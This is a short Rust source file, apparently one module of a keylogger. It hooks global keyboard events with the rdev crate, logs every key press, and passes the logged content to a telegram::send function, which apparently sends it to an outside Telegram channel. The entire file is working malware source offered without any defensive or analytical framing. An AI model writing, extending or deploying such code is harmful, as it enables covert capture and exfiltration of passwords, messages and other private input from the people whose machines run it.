use crate::logger;
use crate::telegram;
use rdev::{Event, EventType, listen};

pub fn keylogger_func() {
    listen(|databaseofkey: Event| {
        if let EventType::KeyPress(_) = databaseofkey.event_type
            && let Some(name) = databaseofkey.name
            && let Some(content) = logger::append_key(&name)
        {
            telegram::send(&content);
        }
    })
    .unwrap();
}
